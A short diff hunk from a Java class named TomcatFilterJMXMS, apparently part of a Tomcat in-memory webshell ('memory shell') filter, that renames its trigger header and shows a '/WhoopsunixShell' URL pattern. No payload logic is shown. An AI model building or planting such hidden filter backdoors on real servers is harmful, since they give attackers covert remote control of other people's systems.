@@ -20,7 +20,7 @@ public class TomcatFilterJMXMS implements Filter {
 
     private static String NAME = "TomcatServletThreadMS";
     private static String pattern = "/WhoopsunixShell";
-    private static String header = "X-Token";
+    private static String header = "Xoken";
 
     public TomcatFilterJMXMS() {
 
